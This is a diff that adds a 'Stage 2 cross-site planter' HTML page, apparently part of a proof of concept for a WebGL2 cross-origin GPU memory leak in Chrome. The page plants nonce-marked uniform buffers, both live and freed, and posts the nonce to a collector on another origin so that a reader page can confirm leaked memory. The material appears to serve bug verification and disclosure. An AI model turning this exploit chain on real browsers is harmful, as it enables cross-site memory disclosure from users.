@@ -1,0 +1,80 @@
+<!doctype html><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Stage 2 planter (origin B)</title>
+<style>body{font:13px/1.5 ui-monospace,Menlo,monospace;margin:12px}pre{white-space:pre-wrap;word-break:break-all}</style>
+<h3>Stage 2 — cross-site planter (origin B)</h3><pre id="o">starting…</pre>
+<script src="collide.js"></script>
+<script>
+/* Plants 32-byte uniform buffers carrying a 24-bit random nonce the READER never sees.
+ * Two classes let the reader's recovery be attributed to LIVE vs FREED memory --
+ * the ambiguity that the original Chrome report could not resolve.
+ *   class 0x11 = LIVE   : allocated once, never deleted for the life of this page
+ *   class 0x22 = FREED  : allocated then explicitly deleted, never reused
+ * The nonce is rotated on demand so a reader opened after rotation distinguishes
+ * fresh cross-site memory from stale pooled memory. */
+const Q = new URLSearchParams(location.search);
+const COLLECT = Q.get('collect') || '';     // absolute https URL of the collector on origin A
+const SIZE = Math.max(64, +(Q.get('size') || 256));   // match the reader's vsize
+const o = document.getElementById('o');
+const say = s => { o.textContent += s + '\n'; };
+const post = (tag, obj) => COLLECT ? fetch(COLLECT + '?tag=' + tag, { method: 'POST', mode: 'cors',
+  headers: { 'content-type': 'text/plain' }, body: JSON.stringify(obj) }).catch(() => {}) : null;
+
+const gl = glctx();
+if (!gl) { say('NO WEBGL2'); throw 0; }
+const E = env(gl);
+say('renderer=' + E.renderer);
+say('plant size = ' + SIZE + ' bytes (' + (SIZE / 16) + ' slots) — must match reader vsize');
+
+let nonce, gen = 0;
+const live = [];
+let seq = 0, freedCount = 0;
+
+function plantOne(cls) {
+  // slot k = [nonce[k%16], class, nonce[(k+1)%16], 255]
+  // Alpha stays 255 and never carries data: the reader's canvas is premultiplied-alpha,
+  // and a low alpha would corrupt the RGB nonce bytes on readPixels. Spreading the nonce
+  // across slots means each recovered slot is an independent confirmation, since an
+  // out-of-allocation read returns every 16-byte slot of the neighbouring buffer.
+  const f = new Float32Array(SIZE / 4);
+  const slots = SIZE / 16;
+  for (let k = 0; k < slots; k++) {
+    f[k * 4 + 0] = nonce[k % 16] / 255;
+    f[k * 4 + 1] = cls / 255;
+    f[k * 4 + 2] = nonce[(k + 1) % 16] / 255;
+    f[k * 4 + 3] = 1;
+  }
+  seq++;
+  const b = gl.createBuffer();
+  gl.bindBuffer(gl.UNIFORM_BUFFER, b);
+  gl.bufferData(gl.UNIFORM_BUFFER, f, gl.STATIC_DRAW);
+  return b;
+}
+
+async function rotate() {
+  nonce = crypto.getRandomValues(new Uint8Array(16)); gen++;
+  const hex = [...nonce].map(x => x.toString(16).padStart(2, '0')).join('');
+  say(`\n[gen ${gen}] nonce=${hex}`);
+  say(`  slot k = [nonce[k%16], class, nonce[(k+1)%16], 255]  over ${SIZE / 16} slots`);
+  say(`  class 0x11 = LIVE (never freed) | 0x22 = FREED`);
+  await post('planter-nonce', { gen, nonce: [...nonce], size: SIZE,
+                                slots: SIZE / 16, t: Date.now(), env: E });
+  // LIVE: 384 buffers that are never deleted.
+  for (let i = 0; i < 384; i++) live.push(plantOne(0x11));
+  // FREED: 384 buffers allocated and immediately released.
+  const tmp = [];
+  for (let i = 0; i < 384; i++) tmp.push(plantOne(0x22));
+  gl.finish();
+  for (const b of tmp) { gl.deleteBuffer(b); freedCount++; }
+  gl.finish();
+  say(`[gen ${gen}] live=${live.length} freed=${freedCount}`);
+}
+
+(async () => {
+  await rotate();
+  say('\nREADY — open the reader on origin A now.');
+  say('Press R (or add &autorotate=1) to rotate the nonce mid-run for the staleness test.');
+  addEventListener('keydown', e => { if (e.key === 'r' || e.key === 'R') rotate(); });
+  if (Q.get('autorotate') === '1') setInterval(rotate, 90000);
+  setInterval(() => post('planter-alive', { gen, live: live.length, freed: freedCount, t: Date.now() }), 10000);
+})();
+</script>
